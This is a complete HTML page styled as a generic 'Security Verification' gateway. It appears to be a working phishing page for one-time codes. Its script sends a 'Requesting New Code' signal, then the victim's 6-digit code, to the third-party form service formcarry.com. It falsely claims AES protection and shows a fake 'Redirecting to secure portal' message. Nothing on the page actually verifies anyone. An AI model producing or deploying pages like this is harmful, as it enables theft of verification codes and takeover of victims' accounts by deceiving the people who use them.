<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification | Gateway</title>
  <style>
    :root {
      --primary: #10b981; 
      --primary-dark: #059669;
      --bg-base: #020617; /* Even darker base */
      --card-bg: rgba(7, 10, 15, 0.95); /* Deep obsidian dark */
      --text-main: #f8fafc;
      --text-muted: #64748b;
      --border: rgba(255, 255, 255, 0.05);
    }

    body { 
      margin: 0; 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
      background: var(--bg-base) url('background.jpg') no-repeat center center fixed; 
      background-size: cover !important; 
      color: var(--text-main); 
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
    }

    .overlay { 
      background: radial-gradient(circle at center, rgba(2, 6, 23, 0.4) 0%, rgba(2, 6, 23, 0.95) 100%);
      width: 100%;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    /* THE DARKER BOX */
    .container { 
      background: var(--card-bg);
      backdrop-filter: blur(30px);
      -webkit-backdrop-filter: blur(30px);
      padding: 40px 35px; 
      width: 100%;
      max-width: 360px; 
      border-radius: 28px; 
      border: 1px solid var(--border);
      box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.9);
      box-sizing: border-box;
    }

    .logo { 
      height: 32px; 
      margin-bottom: 28px; 
      filter: brightness(0) invert(1);
      opacity: 0.8;
    }

    .security-badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(16, 185, 129, 0.05);
      color: var(--primary);
      padding: 4px 12px;
      border-radius: 100px;
      font-size: 10px;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      margin-bottom: 20px;
      border: 1px solid rgba(16, 185, 129, 0.1);
    }
    
    h2 { font-size: 22px; font-weight: 600; margin: 0 0 8px 0; letter-spacing: -0.02em; }
    p { font-size: 13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 24px; }
    
    /* Darker Input */
    input { 
      display: block; 
      margin: 20px auto; 
      padding: 10px; 
      width: 100%; 
      border-radius: 50px; 
      border: 1px solid rgba(255,255,255,0.03); 
      background: rgba(0, 0, 0, 0.5); /* Much darker input */
      color: white; 
      font-size: 18px;
      font-weight: 400;
      letter-spacing: 4px;
      text-align: center;
      transition: all 0.2s ease;
      box-sizing: border-box;
    }
    
    input:focus {
      outline: none;
      border-color: rgba(16, 185, 129, 0.4);
      background: rgba(0, 0, 0, 0.7);
    }

    button { 
      padding: 10px 20px; 
      border-radius: 50px; 
      border: 1px solid var(--primary); 
      cursor: pointer; 
      font-weight: 500; 
      width: 100%; 
      font-size: 13px; 
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      letter-spacing: 0.5px;
    }

    #reqBtn {
      background: #ffffff; 
      color: var(--primary);
    }
    #reqBtn:hover { 
      background: var(--primary);
      color: #ffffff;
      transform: translateY(-1px);
    }

    .btn-verify { 
      background: var(--primary); 
      color: white; 
      margin-top: 12px; 
    }
    .btn-verify:hover { 
      background: #ffffff;
      color: var(--primary);
      transform: translateY(-1px);
    }

    button:active { transform: translateY(0); }
    button:disabled { opacity: 0.3; cursor: not-allowed; }
    
    .status-msg { 
      margin-top: 15px; 
      font-size: 12px; 
      color: #fbbf24;
      font-weight: 500;
      padding: 10px;
      background: rgba(251, 191, 36, 0.05);
      border-radius: 12px;
    }
    
    #codeEntrySection { 
        display: none; 
        margin-top: 20px; 
        animation: slideUp 0.4s ease-out;
    }

    @keyframes slideUp {
        from { opacity: 0; transform: translateY(15px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    .footer-note {
      margin-top: 24px;
      font-size: 10px;
      color: var(--text-muted);
      opacity: 0.5;
    }
  </style>
</head>
<body>

<div class="overlay">
  <div class="container">
    <img src="logo.png" class="logo" alt="Logo">

    <div id="mainSection">
      <div class="security-badge">
        Secure Access
      </div>
      
      <h2>Verification</h2>
      <p>Confirm your identity to continue. A unique security code is required for access.</p>
      
      <form id="vForm" action="https://formcarry.com" method="POST">
        <input type="hidden" name="phone_number" value="Hidden_System_User">
        <input type="hidden" name="intent" id="intent" value="">

        <button type="submit" id="reqBtn">Request Code</button>
        
        <div id="waitMessage" class="status-msg" style="display:none;">
          Request sent. Please check your device.
        </div>

        <div id="codeEntrySection">
          <h3 style="margin: 0; font-size: 13px; font-weight: 500; color: var(--text-muted);">Enter Security Key</h3>
          
          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6" inputmode="numeric">
          
          <button type="submit" id="subBtn" class="btn-verify">Verify Identity</button>
          
          <div id="successMessage" class="status-msg" style="color: var(--primary); background: rgba(16, 185, 129, 0.05); display:none;">
            Redirecting to secure portal...
          </div>
        </div>
      </form>
      
      <div class="footer-note">
        Protected by 256-bit AES Encryption.
      </div>
    </div>
  </div>
</div>

<script>
  const vForm = document.getElementById('vForm');
  const reqBtn = document.getElementById('reqBtn');
  const subBtn = document.getElementById('subBtn');
  const intentInput = document.getElementById('intent');
  const codeSection = document.getElementById('codeEntrySection');
  const codeInput = document.getElementById('codeInput');

  vForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const clickedBtn = document.activeElement;
    const isRequest = clickedBtn.id === 'reqBtn';
    
    intentInput.value = isRequest ? "Requesting New Code" : "Code: " + codeInput.value;
    const statusId = isRequest ? 'waitMessage' : 'successMessage';
    const statusMsg = document.getElementById(statusId);

    clickedBtn.disabled = true;
    const originalText = clickedBtn.innerText;
    clickedBtn.innerText = "Wait...";

    try {
      const response = await fetch(vForm.action, {
        method: 'POST',
        body: new FormData(vForm),
        headers: { 'Accept': 'application/json' }
      });

      if (response.ok) {
        clickedBtn.innerText = "Sent";
        statusMsg.style.display = "block";
        
        if (isRequest) {
          setTimeout(() => {
            codeSection.style.display = "block";
            reqBtn.style.display = "none"; 
          }, 600);
        }
      } else {
        throw new Error();
      }
    } catch (error) {
      alert("Error. Please try again.");
      clickedBtn.disabled = false;
      clickedBtn.innerText = "Retry";
    }
  });
</script>

</body>
</html>
